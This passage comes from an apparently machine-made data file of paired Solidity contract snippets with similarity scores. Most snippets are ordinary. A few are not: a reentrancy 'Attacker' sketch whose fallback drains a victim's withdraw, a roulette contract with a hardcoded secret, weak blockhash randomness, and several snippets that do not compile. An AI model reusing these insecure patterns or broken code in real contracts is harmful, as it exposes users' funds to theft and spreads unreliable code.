     b = new ContractB();
     instancesOfB.push(b);
  }

  
  

  function newB() 
      
      returns(address newContractB)
  {
      b = new ContractB();
      instancesOfB.push(b);
      return b;
  }

}",0.5498101633225949,"contract Utils {

    string constant public contract_version = ""0.4.0"";



    

    

    

    

    function contractExists(address contract_address) public view returns (bool) {

        uint size;



        assembly {

            size := extcodesize(contract_address)

        }



        return size > 0;

    }

}"
"contract MyHashRegistry {

    mapping (uint => uint) hashes:

    function storeHash(uint documentId, uint hash) {
        hashes[documentId] = hash;
    }
}",0.5448352311404481,"contract TrainingScienceInterface {

    
    function mixGenes(uint _heroGenes, uint _floorGenes, uint _equipmentId) external returns (uint);

}"
"contract TestSomething {

    uint256[] public barLengthToBarAmtForSale;

    constructor() public{
        uint16 counter = uint16(0);
        while(counter <= 10) {
            barLengthToBarAmtForSale.push(uint256(0));
            counter++;

        }
    }

    function getVal(uint val) public view returns(uint){
        return barLengthToBarAmtForSale[val]; 
    }

    function setVal(uint16 _length) public {
        barLengthToBarAmtForSale[_length]++;
    }

    function delVal(uint index) public {
        delete barLengthToBarAmtForSale[index];
    }

    function getLen() public view returns(uint){
        return barLengthToBarAmtForSale.length;
    }
}",0.5730894859516826,"contract GBTBasic {

    struct Balance {
        uint256 amount;                 
        uint256 lastUpdated;            
        uint256 nextAllocationIndex;    
        uint256 allocationShare;        
	}

	
	mapping (address => Balance) public balances;
	
    struct Allocation { 
        uint256     amount;
        uint256     date;
    }
	
	Allocation[]   public allocationsOverTime;
	Allocation[]   public currentAllocations;

	function currentAllocationLength() view public returns (uint256) {
		return currentAllocations.length;
	}

	function aotLength() view public returns (uint256) {
		return allocationsOverTime.length;
	}
}"
"contract Verifiable6SidedDiceRoll is VRFConsumerBase {
    using SafeMath for uint;

    bytes32 internal keyHash;
    uint256 internal fee;

    event RequestRandomness(
        bytes32 indexed requestId,
        bytes32 keyHash,
        uint256 seed
    );

    event RequestRandomnessFulfilled(
        bytes32 indexed requestId,
        uint256 randomness
    );

    
    constructor(address _vrfCoordinator, address _link)
        VRFConsumerBase(_vrfCoordinator, _link) public
    {
        vrfCoordinator = _vrfCoordinator;
        LINK = LinkTokenInterface(_link);
        keyHash = 0xced103054e349b8dfb51352f0f8fa9b5d20dde3d06f9f43cb2b85bc64b238205; 
        fee = 10 ** 18; 
    }

    
    function rollDice(uint256 userProvidedSeed) public returns (bytes32 requestId) {
        require(LINK.balanceOf(address(this)) > fee, ""Not enough LINK - fill contract with faucet"");
        uint256 seed = uint256(keccak256(abi.encode(userProvidedSeed, blockhash(block.number)))); 
        bytes32 _requestId = requestRandomness(keyHash, fee, seed);
        emit RequestRandomness(_requestId, keyHash, seed);
        return _requestId;
    }

    function fulfillRandomness(bytes32 requestId, uint256 randomness) external override {
        uint256 d6Result = randomness.mod(899).add(100);
        emit RequestRandomnessFulfilled(requestId, randomness);
    }

}",0.5295909256878744,"contract PromoCode is Ownable {

  ERC20 public token;

  mapping(bytes32 => bool) public used;

  uint256 public amount;



  event Redeem(address user, uint256 amount, string code);



  constructor(ERC20 _token, uint256 _amount) public {

    amount = _amount;

    token = _token;

  }



  function setAmount(uint256 _amount) public onlyOwner {

    amount = _amount;

  }



  function extractSignature(bytes memory signature) private pure returns (uint8 v, bytes32 r, bytes32 s) {

    assembly {

      r := mload(add(signature, 32))

      s := mload(add(signature, 64))

      v := and(mload(add(signature, 65)), 255)

    }

    if (v < 27) {

      v += 27;

    }

    return (v, r, s);

  }



  function redeem(address redeemer, string promoCode, bytes redeemSignature) public {

    bytes32 promoCodeHash = keccak256(abi.encodePacked(address(this), redeemer, promoCode));

    bytes32 hash = keccak256(abi.encodePacked(promoCode));

    (uint8 v, bytes32 r, bytes32 s) = extractSignature(redeemSignature);

    require(!used[hash]);

    used[hash] = true;

    require(ecrecover(keccak256(abi.encodePacked(""\x19Ethereum Signed Message:\n32"", promoCodeHash)), v, r, s) == owner);

    require(token.transferFrom(owner, redeemer, amount));

    emit Redeem(redeemer, amount, promoCode);

  }

}"
"contract AnimalsBitwise {

  struct Animal {
    uint characteristics;
  }

  mapping(bytes32 => Animal) public animals;

  function setAnimal(bytes32 id, uint characteristics) public { 
    
    
  }

  function allTrue(bytes32 id, uint profile) public view returns(bool isIndeed) {
    Animal storage a = animals[id];
    uint characteristics = a.characteristics;
    
    
  }
  function anyTrue(bytes32 id, uint profile) public view returns(bool isIndeed) {
    Animal storage a = animals[id];
    uint characteristics = a.characteristics;
    
    
  }
  function or(bytes32 id, uint profile1, uint profile2) public view returns(bool isIndeed) {
    return allTrue(id, profile1) || allTrue(id, profile2);
  }

  function and(bytes32 id, uint profile1, uint profile2) public view returns(bool isIndeed) {
    return allTrue(id,profile1) && allTrue(id, profile2);
  }
}",0.5858007791799781,"contract ERC20 {

    string public name;

    string public symbol;

    uint8 public decimals;

    uint public totalSupply;

    constructor(string _name, string _symbol, uint8 _decimals) public {

        name = _name;

        symbol = _symbol;

        decimals = _decimals;

    }

    function balanceOf(address who) public view returns (uint);

    function transfer(address to, uint value) public returns (bool);

    function allowance(address owner, address spender) public view returns (uint);

    function transferFrom(address from, address to, uint value) public returns (bool);

    function approve(address spender, uint value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);

    event Approval(address indexed owner, address indexed spender, uint value);

}"
"contract Test {
    event E(bytes data);

    X x = new X();

    function b(bytes memory _b) public payable {

        emit E(msg.data);

        
        bytes memory callData = new bytes(msg.data.length-30);

        for(uint i=0; i<callData.length && i<msg.data.length; i++) {
            callData[i] = msg.data[i];
        }

        
        (bool res, bytes memory ret) = address(x).call(callData);

        assert(res);
    }

}",0.5650295085201434,"contract ProxyFactory {



    event ProxyCreation(Proxy proxy);



    

    

    

    function createProxy(address masterCopy, bytes memory data)

        public

        returns (Proxy proxy)

    {

        proxy = new Proxy(masterCopy);

        if (data.length > 0)

            

            assembly {

                if eq(call(gas, proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) { revert(0, 0) }

            }

        emit ProxyCreation(proxy);

    }

}"
"contract CrowdFunding {

    using HitchensUnorderedKeySetLib for HitchensUnorderedKeySetLib.Set;

    mapping(address => uint) public funderTotalContributions;

    struct Campaign {
        uint totalRaised;
        address beneficiary;
        mapping(address => uint) funderContributions;
        HitchensUnorderedKeySetLib.Set funderSet;
    }

    mapping(bytes32 => Campaign) campaigns;
    HitchensUnorderedKeySetLib.Set campaignSet;

    function newCampaign() public {
        bytes32 campaignId = genCampaignId();
        campaignSet.insert(campaignId);
        campaigns[campaignId].beneficiary = msg.sender;
    }
    function contribute(bytes32 campaignId) public payable {
        require(campaignSet.exists(campaignId), ""Campaign does not exist."");
        Campaign storage c = campaigns[campaignId];
        if(!c.funderSet.exists(addressToBytes32(msg.sender))) c.funderSet.insert(addressToBytes32(msg.sender));
        c.funderContributions[msg.sender] += msg.value;
        funderTotalContributions[msg.sender] += msg.value;
        c.totalRaised += msg.value;
    }
    function getCampaignFundsByAddress(address funder, bytes32 campaignId) public view returns(uint) {
        return campaigns[campaignId].funderContributions[funder];
    }
    function getCampaignInfo(bytes32 campaignId) public view returns(uint, address, uint) {
        require(campaignSet.exists(campaignId), ""Not a campaign."");
        Campaign storage c = campaigns[campaignId];
        return (c.totalRaised, c.beneficiary, c.funderSet.count());
    }
    function getCampaignAtIndex(uint index) public view returns(bytes32) {
        return campaignSet.keyAtIndex(index);
    }
    function getCampaignFunderAtIndex(bytes32 campaignId, uint index) public view returns(address) {
        require(campaignSet.exists(campaignId));
        return bytes32ToAddress(campaigns[campaignId].funderSet.keyAtIndex(index));
    }

    

    function genCampaignId() private view returns(bytes32 campaignId) {
        return keccak256(abi.encodePacked(this, msg.sender, campaignSet.count()));
    }

    

    function addressToBytes32(address a) private pure returns(bytes32) {
        return bytes32(uint(uint160(a)));
    }
    function bytes32ToAddress(bytes32 b) private pure returns(address) {
        return address(uint160(uint(b)));
    }

}",0.549549549498269,"contract EmcoVoucher is Ownable {



	address signerAddress;

	EmcoToken public token;



	mapping (uint => bool) usedNonces;



	event VoucherRedemption(address indexed caller, uint indexed nonce, uint amount);



	constructor(EmcoToken _token) public {

		require(_token != address(0), ""token address should not be empty"");

		token = _token;

	}



	

	function setSignerAddress(address _address) public onlyOwner {

		require(_address != address(0), ""signer address should not be empty"");

		signerAddress = _address;

	}



	

	function withdrawTokens(address _to, uint _amount) public onlyOwner {

		token.transfer(_to, _amount);

	}



	

	function isNonceUsed(uint _nonce) public view returns (bool isUsed) {

		return usedNonces[_nonce];

	}



	

	function activateVoucher(uint256 nonce, uint256 amount, bytes signature) public {

		require(!usedNonces[nonce], ""nonce is already used"");

		require(nonce != 0, ""nonce should be greater than zero"");

		require(amount != 0, ""amount should be greater than zero"");

		usedNonces[nonce] = true;



		address beneficiary = msg.sender;



		bytes32 message = prefixed(keccak256(abi.encodePacked(

			this,

			nonce,

			amount,

		  beneficiary)));



		address signedBy = recoverSigner(message, signature);

		require(signedBy == signerAddress);



		require(token.transfer(beneficiary, amount));

		emit VoucherRedemption(msg.sender, nonce, amount);

	}



	function splitSignature(bytes sig) internal pure returns (uint8, bytes32, bytes32) {

		require(sig.length == 65);



		bytes32 r;

		bytes32 s;

		uint8 v;



		assembly {

			r := mload(add(sig, 32))

			s := mload(add(sig, 64))

			v := byte(0, mload(add(sig, 96)))

		}



		return (v, r, s);

	}



	function recoverSigner(bytes32 message, bytes sig) internal pure returns (address) {

		uint8 v;

		bytes32 r;

		bytes32 s;



		(v, r, s) = splitSignature(sig);



		return ecrecover(message, v, r, s);

	}



	

	function prefixed(bytes32 hash) internal pure returns (bytes32) {

		return keccak256(abi.encodePacked(""\x19Ethereum Signed Message:\n32"", hash));

	}



}"
"contract Test {

    struct S {
        string s;
        uint u;
    }

    function returnTwoValues() private pure returns (string s, uint u) {
        s = ""123"";
        u = 123;
    }

    constructor() public {
        (string memory _s, uint _u) = returnTwoValues();
        S memory s = S(_s, _u);
    }
}",0.5728768634994439,"contract IERC721Metadata is IERC721 {

  function name() external view returns (string memory);

  function symbol() external view returns (string memory);

  function tokenURI(uint256 tokenId) public view returns (string memory);

}"
"contract Attacker {

  

  function () payable {
    
    
    if(sufficientGas) {
       victim.withdraw(amountToStealOnThisIteration); 
    } 
  }

}",0.5264627065396971,"contract IWeth {
    function deposit() public payable;
    function withdraw(uint256 amount) public;
}"
"contract JsonFile {

    event JSONFileEvent(uint256 id, bytes32 product, uint256 prize);

    function writeJsonFile(uint256 _id, bytes32 _product, uint256 _prize) public {
        emit JSONFileEvent(_id, _product, _prize);
    }
}",0.5667645699597945,"contract IBancorX {
    function xTransfer(bytes32 _toBlockchain, bytes32 _to, uint256 _amount, uint256 _id) public;
    function getXTransferAmount(uint256 _xTransferId, address _for) public view returns (uint256);
}"
"contract Money {
  struct People{
    uint id;
    string name;
    uint amount;
  }
  mapping (uint => People) public peoples;
  event votedEvent(uint indexed _candidateId);
  uint public candidateConut;

  constructor() public {
    candidateConut = 0;
    addCandidate(""Holder 1"");
    addCandidate(""Holder 2"");
  }
  function addCandidate(string memory _name) public {
    peoples[candidateConut] = People(candidateConut,_name,0);
    candidateConut++;
  }
  
  function get(uint _candidateId) public view returns(People memory) {
    return peoples[_candidateId];
  }
  
  function getPeople() public view returns (uint[] memory, string[] memory,uint[] memory){
      uint[]    memory id = new uint[](candidateConut);
      string[]  memory name = new string[](candidateConut);
      uint[]    memory amount = new uint[](candidateConut);
      for (uint i = 0; i < candidateConut; i++) {
          People storage people = peoples[i];
          id[i] = people.id;
          name[i] = people.name;
          amount[i] = people.amount;
      }

      return (id, name,amount);

  }
  
  function getPeoples() public view returns (People[] memory){
      People[]    memory id = new People[](candidateConut);
      for (uint i = 0; i < candidateConut; i++) {
          People storage people = peoples[i];
          id[i] = people;
      }
      return id;
  }
}",0.5609133014445875,"contract LAOtokenFactory {
    using SafeMath for uint256;
    
    
    string public stamp;
    
    
    uint256 public etherFee;
    
    LAOtoken private LT;
    
    
    address payable public manager;
    
    address[] public tokens;
    
    event Deployed(address indexed LT, address indexed owner);
    
    constructor(string memory _stamp, uint256 _etherFee, address payable _manager) public 
	{
        stamp = _stamp;
        etherFee = _etherFee;
        manager = _manager;
	}
    
    function newLAOtoken( 
        string memory name, 
		string memory symbol,
		string memory _stamp,
		uint8 decimals,
		IERC20 _fundsToken,
		address[] memory ownership,
		uint256[] memory issuance) public payable {
        require(msg.value == etherFee); 
       
        LT = new LAOtoken(
            name, 
            symbol,
            _stamp,
            decimals,
            _fundsToken,
            ownership,
            issuance);
        
        tokens.push(address(LT));
        
        address(manager).transfer(msg.value);
        
        emit Deployed(address(LT), ownership[0]);
    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
    
    
    function newManagerFee(uint256 weiAmount) public {
        require(msg.sender == manager);
        etherFee = weiAmount;
    }
    
    function transferManager(address payable newManager) public {
        require(msg.sender == manager);
        manager = newManager;
    }
}"
"contract Example {
    struct Sample {
        bytes32 key;
        string str1;
        .
        .
        .
        .
        .
        string str8;
        byts32[] someArray; 
    }

    mapping(bytes32 => Sample) sampleMap;

    function set(Sample data) public returns(bool) {
        sampleMap[data.key] = data;
        return true;
    }

    function get(bytes32 key) returns(Sample) {
        return sampleMap[key];
    }
}",0.5337345682803731,"contract FsTKAuthority {



  function isAuthorized(address sender, address _contract, bytes data) public view returns (bool);

  function isApproved(bytes32 hash, uint256 approveTime, bytes approveToken) public view returns (bool);

  function validate() public pure returns (bytes4);

}"
"contract ForceSender {
  function forceSend(address recipient) payable {
    require(msg.value != 0);
    ForceSend f = (new ForceSend).value(msg.value)(recipient);
    assert(address(f) != address(0));
  }
}",0.5799854842699135,"contract Forward {
    address public destination;
    
    function Forward(address _addr) {
        destination = _addr;
    }
    
    function() payable {
        require(destination.call.value(msg.value)(msg.data));
    }

}"
"contract Test {
    uint public blockNumber;
    bytes32 public blockHashNow;
    bytes32 public blockHashPrevious;

    function setValues() {
        blockNumber = block.number;
        blockHashNow = block.blockhash(blockNumber);
        blockHashPrevious = block.blockhash(blockNumber - 1);
    }    
}",0.5752825014195285,"contract Random {

	uint private pSeed = block.number;



	function getRandom() internal returns(uint256) {

		return (pSeed = uint(keccak256(abi.encodePacked(pSeed,

		blockhash(block.number - 1),

		blockhash(block.number - 3),

		blockhash(block.number - 5),

		blockhash(block.number - 7))

		)));

	}

}"
"contract E {

    uint public n;
    struct User {
        uint id;
        string name;
    }

    mapping (address => User) users;

    function setN(uint _n) public returns (uint, bytes32, uint, string memory) {
        bytes32 dataBytes = 0x111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFCCCC;
        n = _n;
        users[msg.sender] = User(123, ""mystring"");
        return (n, dataBytes, users[msg.sender].id, users[msg.sender].name);
    }
}",0.5505578151866862,"contract Username {
  event Updated(address indexed user, bytes32 username);

  mapping(address => bytes32) public username;
  mapping(bytes32 => bool) public used;

  function Update(bytes32 _username) public {
    require(!used[_username]);
    bytes32 oldUserName = username[msg.sender];
    used[_username] = true;
    used[oldUserName] = false;
    username[msg.sender] = _username;
    emit Updated(msg.sender, _username);
  }
}"
"contract B {

    A contractA;

    constructor() public {
        contractA = new A();
    }

    function callA(string param) public view returns(string) {
        string memory callResult=contractA.methodA(param);
        return callResult;
    }

}",0.5885679958880202,"contract Context {
    constructor () public { }

    function _msgSender() public view returns (address) {
        return msg.sender;
    }

    function _msgData() public view returns (bytes memory) {
        this;
        return msg.data;
    }
}"
"contract C {
    bytes32 public x = 0xffff;

    function changeX() external {
        x = 0xffaa;
    }
}",0.5971732030894703,"contract MedianizerLike {

    function peek() external view returns (bytes32, bool);

}"
"contract AssetFactory {
    Asset[] public deployedAssets;

  function createAsset(string name) public returns (Asset) {
    Asset newAsset = new Asset(name);
    deployedAssets.push(newAsset);
    return newAsset;
  }

  function isFactory() public pure returns(bool isIndeed) {
    return true;
  }
}",0.5846321961675038,"contract CreateBlogger {

    address [] public deployedBlogs;



    function createBlogger() public returns(address) {

        address newBlogger = new Blogger(msg.sender);

        deployedBlogs.push(newBlogger);

        return newBlogger;

    }



    function getDeployedBlogs() public view returns(address[]) {

        return deployedBlogs;

    }

}"
"contract Asset {
  string public name;
  AssetFactory factory;

  event LogAsset(address sender, bool isFactory);

  function Asset(string _name) public {
    name = _name;
    factory = AssetFactory(msg.sender);
  }

  

  function modifyAssetAndCreateNew(string _name) public {
    factory.createAsset(_name);
    name = _name;
  }   
}",0.5613933261949917,"contract SecurityToken is ERC20 {

	string public name;

	string public symbol;

	uint8 public decimals = 0;

	constructor(string memory _name, string memory _symbol, uint initialSupply) public {

		name = _name;

		symbol = _symbol;

		addWhitelist(msg.sender);

		_mint(msg.sender, initialSupply);

	}

}"
"contract A {
    function makeCall(address addressB) {
        AbstractB(addressB).getX.value(1 ether).gas(0);
    }
}",0.5937664856595537,"contract AbstractSweeperList {
    function sweeperOf(address _token) returns (address);
}"
"contract ClientFactory {

    event LogNewClientCreated(address sender, address newClient);

    function createClient(address storageContract) public returns(address newClient) {
        Client c = new Client(storageContract);
        LogNewClientCreated(msg.sender, c);
        return c;
    }
}",0.5885913960843829,"contract UserProfileFactory{
  event NewUserProfileContract(address addr);

  function createUserProfile(address _multisig) public returns(address addr){
    UserProfile up = new UserProfile(_multisig);
    emit NewUserProfileContract(address(up));
    return address(up);
  }
}"
"contract C {
  modifier restrictTargetType(address target, uint contractType) {
    require(contractTypes[target] == contractType);
    _;
  }
  function f(address target, uint contractType) restrictTargetType(target, contractType) {
    ....
  }
}",0.5719542353874069,"contract CommonModifiersInterface {



  

  function isContract(address _targetAddress) internal constant returns (bool);



  

  modifier onlyContractAddress(address _targetAddress) {

    require(isContract(_targetAddress) == true);

    _;

  }

}"
"contract Alarm is usingOraclize {
    function Alarm() {
       oraclize_query(1*day, ""URL"", """");
    }

    function __callback(bytes32 myid, string result) {
        if (msg.sender != oraclize_cbAddress()) throw;
        
    }
}",0.5609285238526626,"contract iRNG {

    function update(uint roundNumber, uint additionalNonce, uint period) public payable;

    function __callback(bytes32 _queryId, uint _result) public;

}"
"contract SampleContract {

  struct ChildStruct {
    bool isPresent;
    bytes32 name;
  }

  struct ParentStruct {
    bool isPresent;
    bytes32 name;
    mapping (bytes32 => ChildStruct) childStructs; 
  }

  mapping(bytes32 => ParentStruct) public parentStructs;

  function insertData(
    bytes32 parentKey, 
    bytes32 parentName, 
    bytes32 childKey, 
    bytes32 childName)
    public 
    returns(bool success)
  {

    parentStructs[parentKey].isPresent = true;
    parentStructs[parentKey].name = parentName;
    parentStructs[parentKey].childStructs[childKey].isPresent = true;
    parentStructs[parentKey].childStructs[childKey].name = childName;
    return true;
  }

  function getChild(bytes32 parentKey, bytes32 childKey) public constant returns(bool isPresent, bytes32 name) {
    return (parentStructs[parentKey].childStructs[childKey].isPresent, parentStructs[parentKey].childStructs[childKey].name);
  }

}",0.5029428217355936,"contract TopCompanyFactoryInterface is Ownable {

    struct TopCompany {

        bytes32 name;

        uint256 performance;

        bytes32 logoUrl;

    }



    uint256 public startPrice; 

    int256 public startBlock;

    uint256 public initialAvailableCount;



    

    uint256 public blocksBetweenNewCompany;



    uint256 public companyCount;

    TopCompany[] public companies;

    mapping(bytes32 => uint256) public companiesIndex;

    function canBuyCompany(bytes32 nameLowercase) public view returns (bool);

    function getCompanyByName(bytes32 nameLowercase) public view returns (bytes32 name, uint256 performance, bytes32 logoUrl);

    function getCompany(uint256 index) public view returns (bytes32 name, uint256 performance, bytes32 logoUrl);

    function removeCompany(bytes32 nameLowercase) public returns (uint256);

}"
"contract SendBalanceContract is Ownable {

    using ERC165Checker for address; 

    ERC721 public nonFungibleContract;

    bytes4 constant InterfaceSignature_ERC721 = bytes4(0x9a20483d);

    constructor(address _nftAddress) public {

        ERC721 candidateContract = ERC721(_nftAddress);
        require(candidateContract.supportsInterface(InterfaceSignature_ERC721)); 
        nonFungibleContract = candidateContract;
    }

    function withdrawBalance() external {
        address nftAddress = address(nonFungibleContract);

        require(msg.sender == owner() || msg.sender == nftAddress);
        
        (bool sent, bytes memory data) = nftAddress.call{value:address(this).balance}("""");
    }
}",0.5727393744865533,"contract Factory {

  address admin;

  
  mapping (address => address) contractPurchaseRecord;

  function Factory() public {
    admin = msg.sender;      
  }

  function withdrawETH() external {
    require(msg.sender == admin);
    admin.transfer(this.balance);
  }

  function deployContract() external {
    require(contractPurchaseRecord[msg.sender] == address(0));
    EthPyramid pyramid = new EthPyramid(address(this));
    contractPurchaseRecord[msg.sender] = address(pyramid);      
  }

  function checkContractAddress(address creator) external view returns(address) {
    return contractPurchaseRecord[creator];  
  }
  
  
  function() external payable {
     admin.transfer(msg.value);      
  }  
 
}"
"contract Child is Parent {
  function (){
    log0(""child fallback function"");
    super.fallback();
  }
}",0.5561652038297242,"contract MintableToken {
    
    function mint(uint amount, address account);

    
    function start();
}"
"contract Example {

   Token public myToken;

   
  function Example() {
       myToken = new Token();
  }
}",0.5922214040647146,"contract Token is MintableToken {

  function mint(address, uint256) public returns (bool);

}"
"contract TimeServer {

  uint256 FUDGE_FACTOR_IN_BLOCKS = 2;
  uint256 public lastBlockNumber;
  uint256 public lastBlockTime;

  constructor(uint256 firstBlockNumber) {
    require(abs(firstBlockNumber - block.number) < FUDGE_FACTOR_IN_BLOCKS));
    lastBlockNumber = block.number;
    lastBlockTime = now;
  }

  function submitNewTime(uint256 newBlockNumber, uint256 newBlockTime) public {
    uint blockDiff = newBlockNumber - lastBlockNumber;
    require(blockDiff > 0, `New block number must be later than last block')'
    uint timeDiff = newBlockTime - lastBlockTime;
    require(abs(timeDiff / 15) - blockDiff) < FUDGE_FACTOR_IN_BLOCKS,
            'Submitted block time is off by more than +/- fudge factor.') )
    lastBlockNumber = newBlockNumber;
    lastBlockTime = newBlockTime;
  }

}",0.5162143337546804,"contract CryptoRoulette {

    uint256 private secretNumber;
    uint256 public lastPlayed;
    uint256 public betPrice = 0.001 ether;
    address public ownerAddr;

    struct Game {
        address player;
        uint256 number;
    }
    Game[] public gamesPlayed;

    constructor() public {
        ownerAddr = msg.sender;
        shuffle();
    }

    function shuffle() internal {
        
        secretNumber = 6;
    }

    function play(uint256 number) payable public {
        require(msg.value >= betPrice && number <= 10);

        Game game;
        game.player = msg.sender;
        game.number = number;
        gamesPlayed.push(game);

        if (number == secretNumber) {
            
            msg.sender.transfer(this.balance);
        }

        
        lastPlayed = now;
    }

    function kill() public {
        if (msg.sender == ownerAddr && now > lastPlayed + 6 hours) {
            suicide(msg.sender);
        }
    }

    function() public payable { }
}"
"contract Test {

    event Event1(bytes data, uint256 updatedAt);
    event Event2(bytes data, uint256 updatedAt);

    
    uint256 public lastBlock;

    function dosomething1(bytes data) public {
        emit Event1(data, lastBlock);
        lastBlock = block.number;
    }

    function dosomething2(bytes data) public {
        emit Event2(data, lastBlock);
        lastBlock = block.number;
    }
}",0.5525862096275584,"contract ERC223Interface {

	uint256 public totalSupply;

	function transfer(address to, uint256 value) public;

	function transfer(address to, uint256 value, bytes memory data) public;

	event Transfer(address indexed from, address indexed to, uint256 value, bytes data);



	mapping (address => uint256) public balanceOf;

}"
"contract Banker {
    address silverCoinAddress;

    function Banker(address _silverCoinAddress) {
        silverCoinAddress = _silverCoinAddress;
    }

(...)",0.5596955917399452,"contract GenTokenAddress {
    function GenTokenAddress(address token, address to) {
        I(token).transfer(to, I(token).balanceOf(address(this)));
    }
}"
"contract B {
    
    address burnContract = 0x0987;

    
    function PerformBurn() public {
        

        A original = A(burnContract);
        original.burn(5);
    }
}",0.5821993823543101,"contract BurnableToken {
  function transferFrom(address, address, uint) public returns (bool);
  function burn(uint) public;
}"
"contract WorksOnce {

    bool isUsed;

    event LogLuckyWinner(address sender);

    function pickMe() public {
        require(!isUsed);
        isUsed = true;
        emit LogLuckyWinner(msg.sender);
    }
}",0.5844933758326131,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public returns (bool) {

        if (Owner == msg.sender) {

            return true; 

        }

        return false;

    }

}"
"contract ObjectFactory {
    Object public theObj;

    function createObject(string name) returns (address objectAddress) {
        theObj = address(new Object(name));
        return theObj;
    }
}",0.5844018789361203,"contract KMHTokenInterface {

  function checkRole(address addr, string roleName) public view;



  function mint(address _to, uint256 _amount) public returns (bool);

}"
"contract Game {
  address[] public winners;
  function submitWinningMove(bytes32 move) public returns(bool success) {
    require(gameIsOn());
    require(moveIsAllowed(move));
    require(moveIsWinner(move));
    winners.push(msg.sender);
    require(closeGame());
    emit LogWinningMove(msg.sender, move);
    return true;
   }
}",0.5702341148264455,"contract Owned {

    address owner;

    constructor() public {

        owner = msg.sender;

    }

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    function transferOwnership(address newOwner) onlyOwner public returns (bool success) {

        require (newOwner != address(0));

        owner = newOwner;

        return true;

    }

}"
"contract Unique {

    address[] public tokenHolders;

    

    mapping(address => bool) public tokenHolderKnown;

    function scalableAddTokenHolder(address tokenHolder) returns(bool succes) {
        if(!tokenHolderKnown[tokenHolder]) {
            tokenHolders.push(tokenHolder);
            tokenHolderKnown[tokenHolder] = true;
            return true;
        }
        return false;
    }

}",0.5813799268442825,"contract TokenLocker {
    
    address public owner;

    ERC20 public token;

    
    function TokenLocker (ERC20 tokenAddr) public {
        owner = msg.sender;
        token = tokenAddr;
    }

    
    function transfer(address dest, uint amount) public returns (bool) {
        require(msg.sender == owner);
        return token.transfer(dest, amount);
    }

}"
"contract ZonesFactory {
    address[] zones;
    event LogCreatedZone(address indexed hsAddr, bytes32 name, bytes32 P1Lon, bytes32 P1Lat, bytes32 P2Lon, bytes32 P2Lat, bytes32 P3Lon, bytes32 P3Lat, bytes32 P4Lon, bytes32 P4Lat);

    function add(bytes32 name, bytes32 P1Lon, bytes32 P1Lat, bytes32 P2Lon, bytes32 P2Lat, bytes32 P3Lon, bytes32 P3Lat, bytes32 P4Lon, bytes32 P4Lat) public returns(address) {
        zoneObject newZone = new zoneObject(name, P1Lon, P1Lat, P2Lon, P2Lat, P3Lon, P3Lat, P4Lon, P3Lat);
        zones.push(newZone);
        LogCreatedZone(newZone,name, P1Lon, P1Lat, P2Lon, P2Lat, P3Lon, P3Lat, P4Lon, P3Lat);
        return newZone;
    }

    function getOrgAtIndex(uint index) public constant returns(address org){
        return zones[index];
    }

    function getOrganizationCount() public constant returns(uint count) {
        return zones.length;
    }
}",0.5251988983648721,"contract MyWishEosRegister {

    event RegisterAdd(address indexed, string, bytes32);

    mapping(address => bytes32) private register;

    

    function put(string _eosAccountName) external {

        require(register[msg.sender] == 0, ""address already bound"");

        bytes memory byteString = bytes(_eosAccountName);

        require(byteString.length == 12, ""worng length"");



        for (uint i = 0; i < 12; i ++) {

            byte b = byteString[i];

            require((b >= 48 && b <= 53) || (b >= 97 && b <= 122), ""wrong symbol"");

        }

        bytes32 result;

        assembly {

            result := mload(add(byteString, 0x20))

        }

        register[msg.sender] = result;

        emit RegisterAdd(msg.sender, _eosAccountName, result);

    }



    

    function get(address _addr) public view returns (string memory result) {

        bytes32 eos = register[_addr];

        if (eos == 0) {

            return;

        }

        result = ""............"";

        assembly {

            mstore(add(result, 0x20), eos)

        }

    }



    

    function get() public view returns (string memory) {

        return get(msg.sender);

    }

}"
"contract tracking  {

  struct  data  {
    uint   ownernumber;
    uint   id;
  }

  uint value;
  mapping (uint256 => data) public  datamatching;

  function storedata (uint _ownernumber, uint _id) public {
    var  persondata  = datamatching[value];
    persondata .ownernumber = _ownernumber;
    persondata. id  =  _id;
  }

  function getData(uint256 userId) returns (data){
    return datamatching[userId];
  }
}",0.5876091064759058,"contract Database {

    address public owner;

    constructor() public {
      owner = msg.sender;
    }
    
    function withdraw() public {
      require(msg.sender == owner);
      owner.transfer(address(this).balance);
    }

    
    
    event Table(uint256 indexed _row, string indexed _column, string indexed _value);
    

    function put(uint256 _row, string _column, string _value) public {
        emit Table(_row, _column, _value);
    }
}"
"contract Play {

    address public playOwnerAddress;
    bytes32 public playOwnerName;
    bytes32 public playTitle;

    

    struct PlayActionStruct  {
        bytes32   playTitle;       
        bytes32   playWorkerName;
        address   playWorkerAddress;
        bytes32   playAction;
        bytes32   playActionDescription;
        bytes32   playStatus;
    }

    

    PlayActionStruct [] public playActions;

    event LogInsertPlayAction(
        bytes32   _playTitle,
        bytes32   _playWorkerName,
        bytes32   _playAction,
        bytes32   _playActionDescription,
        bytes32   _playStatus);

    modifier onlyOwner(){
        require(msg.sender == playOwnerAddress);
        _;
    }

    function Play(bytes32 thisPlayOwnerName, bytes32 thisPlayTitle) public  {
        playOwnerAddress = msg.sender;
        playOwnerName    = thisPlayOwnerName;
        playTitle        = thisPlayTitle;
    }

    function appendPlayAction(
        bytes32   _playTitle,
        bytes32   _playWorkerName,
        bytes32   _playAction,
        bytes32   _playActionDescription,
        bytes32   _playStatus)
        public
        onlyOwner 
        returns(bool success)
    {
        

        PlayActionStruct memory p;
        p.playAction            = _playTitle;
        p.playWorkerName        = _playWorkerName;
        p.playWorkerName        = _playWorkerName;
        p.playWorkerAddress     = msg.sender;
        p.playAction            = _playAction;
        p.playActionDescription = _playActionDescription;
        p.playStatus            = _playStatus;
        playActions.push(p);

        LogInsertPlayAction(
            _playTitle,
            _playWorkerName,
            _playAction,
            _playActionDescription,
            _playStatus);
        return true;
    }

    function getActionCount() public view returns(uint count) {
        return playActions.length;
    }
}",0.5243958769372067,"contract RegistryInterface {
    function initiateProvider(uint256, bytes32) public returns (bool);
    function initiateProviderCurve(bytes32, int256[], address) public returns (bool);
    function initiateCustomCurve(bytes32, int256[], address, address) public returns (bool);
    function setEndpointParams(bytes32, bytes32[]) public;
    function getEndpointParams(address, bytes32) public view returns (bytes32[]);
    function getProviderPublicKey(address) public view returns (uint256);
    function getProviderTitle(address) public view returns (bytes32);
